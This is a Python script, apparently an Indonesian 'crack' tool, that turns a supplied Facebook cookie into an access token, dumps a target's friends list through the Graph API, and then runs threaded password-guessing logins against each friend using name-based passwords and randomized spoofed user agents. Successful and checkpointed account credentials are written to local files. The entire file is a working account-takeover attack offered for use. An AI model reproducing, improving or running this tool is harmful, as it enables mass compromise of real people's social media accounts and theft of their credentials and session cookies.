##--[ IMPORT MODULE ]--##
import requests,bs4,json,os,sys,random,datetime,time,re,rich,stdiomask
from time import sleep
from time import time as tod
from concurrent.futures import ThreadPoolExecutor as tred
from rich import print as prints
from rich.console import Console
from rich.tree import Tree
from rich.console import Console as sol
from rich.columns import Columns
from rich.console import Console
from rich.panel import Panel as tabel
from rich import print as tulis
from rich.markdown import Markdown as mark
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn
##--[ GLOBAL NAME ]--##
loop,ok,cp = 0,0,0
ses = requests.Session()
uaw = []
id,id2 = [],[]
account = []
todeo = []
##--[ USER AGENT ]--##
for delta in range(10000):
	rr = random.randint
	rc = random.choice
	andro =  rc(["9","10","11","12","13","14"])
	model = rc(["RMX3125","RMX3700","RMX3706","RMX3709"])
	build = rc(["RP1A.200720.011; wv","UKQ1.230924.001; wv","TP1A.220905.001; wv"])
	u1 = f"Mozilla/5.0 (Linux; Android {andro}; {model} Build/{build}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(80,120))}.0.{str(rr(6099,6261))}.{str(rr(99,120))} Mobile Safari/537.36"
	laso = rc([u1])
	uaw.append(laso)
##--[ WARNA ]--##
p = '\x1b[1;97m'# PUTIH
m = '\x1b[1;91m' # MERAH
k = '\x1b[1;93m' # KUNING
h = '\x1b[1;92m' # HIJAU
u = '\x1b[1;95m' # UNGU
b = '\x1b[1;94m' # BIRU
x = '\33[m'  # DEFAULT
X = '\33[m'  # DEFAULT2
##--[ CONVERTER ]--##
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
##--[ SUPPORT SCRIPT ]--##
def bu():
	os.system('clear')
def io():
	menu()
def cepmek():
	print(f'{p}╭────────────────────────────────────────────')
##--[ LOGO/BANNER ]--##
def author():
	print(f'{p}─'*45)
	print(f'''{u} ██▄   ▄███▄   █      ▄▄▄▄▀ ██       ▄    ▄
 █  █  █▀   ▀  █   ▀▀▀ █    █ █  ▀▄   █    █
 █   █ ██▄▄    █       █    █▄▄█   █ ▀  ██  █
 █  █  █▄   ▄▀ ███▄   █     █  █  ▄ █   █ █ █
 ███▀  ▀███▀       ▀ ▀         █ █   ▀▄ █  ██''')
	cepmek()
author()
##--[ LOGIN COOKIE ]--##
def login():
	bu();author()
	print(f'{p}╰── Jangan Gunakan Akun {m}Pribadi {p}Untuk Login')
	cok = input(f'╰── Masukkan Cookie : {u}')
	try:
		head = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36"}
		link = ses.get("https://web.facebook.com/adsmanager?_rdc─1&_rdr", headers=head, cookies={"cookie": cok})
		find = re.findall('act=(.*?)&nav_source', link.text)
		if len(find) == 0:print('');cepmek();print(f'{m}Login Gagal, Cookie Invalid Atau Graph Sudah Meti');time.sleep(3);login()
		else:
			for x in find:
				xz = ses.get(f"https://web.facebook.com/adsmanager/manage/campaigns?act={x}&nav_source=no_referrer", headers = head, cookies={"cookie": cok})
				took = re.search('(EAAB\w+)',xz.text).group(1)
				open('.tok.txt', 'a').write(took);open('.cok.txt', 'a').write(cok)
				print('');cepmek();print(f'{p}╰── Token : {u}{took}')
				print('');cepmek();print(f'{p}╰── {u}LOGIN SUCCES')
				time.sleep(3)
				menu()
	except Exception as e:exit(e)
##--[ MENU MEMEK ]--##
def menu():
	bu();author()
	try:
		token = open('.tok.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		tulis(tabel(f"[bold red]╰── Cookie Kedaluarsa",width=25,style=f"bold white"))
		time.sleep(3)
		login()
	try:
		info_datafb = ses.get(f"https://graph.facebook.com/me?fields=name,id&access_token={token}", cookies = {'cookies':cok}).json()
		nama = info_datafb["name"]
		id = info_datafb["id"]
		ip = requests.get("http://ip-api.com/json/").json()["query"]
	except requests.exceptions.ConnectionError:
		tulis(tabel(f"[bold red]╰── Koneksi Erorrrrrrr",width=30,style=f"bold white"));exit()
	except KeyError:
		try:os.remove(".cok.txt");os.remove(".tok.txt")
		except:pass
		print(f"{m}Sepertinya Akun Kamu Terken CP...");time.sleep(2)
		menu()
		author()
		os.system('clear')
	print(f'''{p}╰── Author : {u}DELtaXN
{p}╰── Nama Tumbal : {u}{nama}
{p}╰── Id Tumbal : {u}{id}
{p}╰── Alamat Ip : {u}{ip}''')
	cepmek()
	print(f'''{p}╰── 01.Crack Publik
╰── 02.Crack Massal
╰── 03.Crack File
╰── 04.Crack Gmail
╰── 05.Check Result
╰── {m}00.Keluar/Ganti Cookie''')
	cepmek()
	vale = input(f'{p}╰── Pilih Menu : {u}')
	if vale in ["1","01"]:
		idt = input(f'{p}╰── Masukkan Id Target : {u}')
		dump(idt,"",{"cookie":cok},token)
		setelan_id()
	if vale in ["02","2"]:
		print('Belum Tersedia')
	if vale in ["3","03"]:
		print('Belum Tersedia')
	if vale in ["04","4"]:
		print('Belum Tersedia')
	if vale in ["05","5"]:
		result()
	if vale in ["00","0"]:
		os.system('rm -rf .tok.txt')
		os.system('rm -rf .cok.txt')
		cepmek()
		print('╰── Berhasil Keluar')
		login()
	else:
		cepmek()
		print('╰── Ngetik Yang Serius Mas')
		time.sleep(2);menu()
##--[ CHECK RESULT ]--##
def result():
	cepmek
	print(f'''{p}╰──{u} 01.Check Hasil Succes
{p}╰──{m} 02.Check Hasil Checkpoint''')
	print('');kz = input(f'{p}╰── Pilih Hasil : {u}')
	if kz in ['2','02']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			print(' ╰── File Tidak Di Temukan ')
			time.sleep(3)
			menu()
		if len(vin)==0:
			print(f'{p}╰──{m} Anda Tidak Memiliki Hasil Checkpoint ')
			time.sleep(4)
			menu()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					cepmek()
					print(f'{p}╰──{m} '+nom+'.'+isi+' '+str(len(hem))+' Akun '+x)
				else:
					lol.update({str(cih):str(isi)})
					cepmek()
					print(f'{p}╰──{m} '+str(cih)+'.'+isi+' '+str(len(hem))+' Akun '+x)
			print('')
			cepmek()
			geeh = input(f'{p}╰──{m} Pilih Yang Mau Dicek: ')
			try:geh = lol[geeh]
			except KeyError:
				print('{p}╰──{m} Ngetik Yang Serius Mas ')
				exit()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				print(' ╰── File Tidak Di Temukan ')
				time.sleep(4)
				menu()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				cepmek()
				print(f'{p}╰──{m} {cpkuni[0]}|{cpkuni[1]}')
				nocp +=1
			print('')
			cepmek()
			input(f'{p}╰── {m}Klik Enter Untuk Kembali')
			menu()
	elif kz in ['1','01']:
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			print(f'{p}╰──{u} File Tidak Di Temukan')
			time.sleep(4)
			menu()
		if len(vin)==0:
			print(f'{p}╰──{u} Anda Tidak Mempunyai File Succes')
			time.sleep(4)
			menu()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<80:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					cepmek()
					print(f'{p}╰──{u} '+nom+'.'+isi+' '+str(len(hem))+' Akun '+x)
				else:
					lol.update({str(cih):str(isi)})
					cepmek()
					print('{p}╰──{u} '+str(cih)+'.'+isi+' '+str(len(hem))+' Akun '+x)
			print('')
			cepmek()
			geeh = input(f'{p}╰──{u} Pilih Yang Mau Dicek : ')
			try:geh = lol[geeh]
			except KeyError:
				print(' ╰── Ngetik Yang Serius Mas ')
				menu()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				print(' ╰── File Tidak Di Temukan ')
				time.sleep(4)
				menu()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				cepmek()
				print(f'{p}╰── {u}{cpkuni[0]}|{cpkuni[1]}')
				print(f'{p}╰── {u}{cpkuni[2]}')
				nocp +=1
			print('')
			cepmek()
			input(f'{p}╰──{u} Klik Enter Untuk Kembali')
			menu()
	else:
		print(f'{p}╰──{u} Ngetik Yang Serius Mas ')
		exit()
##--[ CRACK PUBLIK ]--##
def dump(idt,fields,cookie,token):
	try:
		headers = {
			"connection": "keep-alive", 
			"accept": "*/*", 
			"sec-fetch-dest": "empty", 
			"sec-fetch-mode": "cors",
			"sec-fetch-site": "same-origin", 
			"sec-fetch-user": "?1",
			"sec-ch-ua-mobile": "?1",
			"upgrade-insecure-requests": "1", 
			"user-agent": "Mozilla/5.0 (Linux; Android 11; AC2003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
			"accept-encoding": "gzip, deflate",
			"accept-language": "id-ID,id;q=0.9"
		}
		if len(id) == 0:
			params = {
				"access_token": token,
				"fields": f"name,friends.fields(id,name,birthday)"
			}
		else:
			params = {
				"access_token": token,
				"fields": f"name,friends.fields(id,name,birthday).after({fields})"
			}
		url = ses.get(f"https://graph.facebook.com/{idt}",params=params,headers=headers,cookies=cookie).json()
		for i in url["friends"]["data"]:
			#print(i["id"]+"|"+i["name"])
			id.append(i["id"]+"|"+i["name"])
			print(f'{p}╰── Sukses Mengumpulkan {u}{len(id)} {p}Id')
		dump(idt,url["friends"]["paging"]["cursors"]["after"],cookie,token)
	except:pass
##--[ SETELAN ID ]--##
def setelan_id():
	for koi in sorted(id):
		id2.append(koi)
	thode()
##--[ PILIH METHODE ]--##
def thode():
	print('');cepmek()
	print(f'''{p}╰── 01.Methode {u}Validate
{p}╰── 02.Methode {u}Reguler''')
	cepmek()
	poi = input(f"{p}╰── Pilih Methode : {u}")
	if poi in ["01","1"]:
		todeo.append('lidate')
	elif poi in ["02","2"]:
		print('Tangan Gue Masih Capek Ngoding Reguler')
	else:
		todeo.append('lidate')
	wrdlist()
##--[ WORDLIST ]--##
def wrdlist():
	global prog,des
	print('')
	tulis(tabel(f"\t[bold purple]IF NO RESULTS, PLAY AIRCRAFT MODE",title=f"[bold white][ [bold purple]Pesan [bold white]]",style=f"bold white"))
	prog = Progress(TextColumn('{task.description}'))
	des = prog.add_task('',total=len(id2))
	with prog:
		with tred(max_workers=30) as skuy:
			for pokx in id2:
				idf,pmf = pokx.split('|')[0],pokx.split('|')[1].lower()
				freeze = pmf.split(' ')[0]
				pwz = []
				if len(pmf)<6:
					if len(freeze)<3:
						pass
					else:
						pwz.append(freeze+'123')
						pwz.append(freeze+'1234')
						pwz.append(freeze+'12345')
				else:
					if len(freeze)<3:
						pwz.append(pmf)
					else:
						pwz.append(pmf)
						pwz.append(freeze+'123')
						pwz.append(freeze+'1234')
						pwz.append(freeze+'12345')
				if 'lidate' in todeo:
					skuy.submit(kyorugi,idf,pwz)
				elif 'guler' in method:
					skuy.submit(poomsae,idf,pwz)
				else:
					skuy.submit(kyorugi,idf,pwz)
		print('')
	tulis(tabel(f"[bold white]Maaf Kalau Scnya Kurang Gacor Yaah",width=40,style=f"bold white"));exit()
##--[ VALIDATE METHODE ]--##
def kyorugi(idf,pwz):
	global loop,ok,cp
	ses = requests.Session()
	rr = random.randint
	rc = random.choice
	gaya = rc([f"{m}DELtaXN",f"{k}DELtaXN",f"{h}DELtaXn",f"{b}DELtaXN",f"{u}DELtaXN"])
	prog.update(des,description=f"{gaya}[bold white] [{loop}/{len(id)}] [[bold green]OK : {ok}][/] [bold white][[bold yellow]CP : [bold yellow]{cp}[bold white]][/]")
	prog.advance(des)
	for pw in pwz:
		try:
			ua = rc(uaw)
			link = ses.get(f"https://m.prod.facebook.com/login/device-based/password/?uid={idf}&flow=login_no_pin&refsrc=deprecated&_rdr")
			tada = ({"lsd": re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),"jazoest": re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),"uid": idf,"next": "https://m.prod.facebook.com/login/save-device/","flow": "login_no_pin","pass": f"#PWD_BROWSER:0:{str(tod()).split('.')[0]}:{pw}"})    
			kuks = (";").join([ "%s=%s" % (key, value) for key, value in link.cookies.get_dict().items() ])		
			dres = ({'Host': 'm.prod.facebook.com','content-length': f'{str(rr(344,450))}','cache-control': 'max-age=0','dpr': '2','viewport-width': f'{str(rr(300,980))}','sec-ch-ua': f'"Not;A=Brand";v="{str(rr(8,24))}", "Chromium";v="{str(rr(99,120))}"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','sec-ch-ua-platform-version': f'"{str(rr(9,14))}.0.0"','sec-ch-ua-full-version-list': f'"Not;A=Brand";v="{str(rr(8,24))}.0.0.0", "Chromium";v="{str(rr(99,120))}.0.{str(rr(6099,6261))}.{str(rr(80,178))}"','sec-ch-prefers-color-scheme': 'light','upgrade-insecure-requests': '1','origin': 'https://m.prod.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': f'https://m.prod.facebook.com/login/device-based/password/?uid={idf}&flow=login_no_pin&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			po = ses.post(f"https://m.prod.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID", headers=dres, data=tada, cookies={'cookie': kuks}, allow_redirects=False)
			if "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki = ses.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\n{p}╭────────────────────────────────────────────')
				print(f'{p}╰── {u}LOGIN SUCCES')
				print(f'{p}╰── {u}{idf}|{pw}')
				print(f'{p}╰── {u}{kuki}')
				open(f'OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
				break
			elif "checkpoint" in po.cookies.get_dict().keys():
				print(f'\n{p}╭────────────────────────────────────────────')
				print(f'{p}╰── {m}LOGIN CHECKPOINT')
				print(f'{p}╰── {m}{idf}|{pw}')
				print(f'{p}╰── {m}{ua}')
				open(f'CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				account.append(idf+'|'+pw)
				cp+=1
				break	
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

##--[ SYSTEM CONTROL ]--##	
if __name__=='__main__':
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.system('clear')
	except:pass
	menu()